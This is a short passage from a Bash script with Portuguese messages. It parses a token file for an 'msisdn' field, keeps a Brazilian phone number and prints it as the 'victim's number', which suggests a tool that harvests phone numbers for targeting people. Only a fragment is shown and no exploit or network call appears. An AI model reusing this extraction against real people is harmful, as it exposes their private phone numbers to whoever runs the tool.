*) echo -e "${RED}NENHUM ads novo foi encontrado${NADA}" ;;
esac

NumeroDeTelefone=$(cat tokencreator2.txt | grep -o msisdn.................................... | cut -d '"' -f3 | grep -n 55 | grep 1: | cut -d':' -f2)

echo
echo -e "${CINZA}Número da vítima:${NADA} ${GREEN}$NumeroDeTelefone${NADA}"
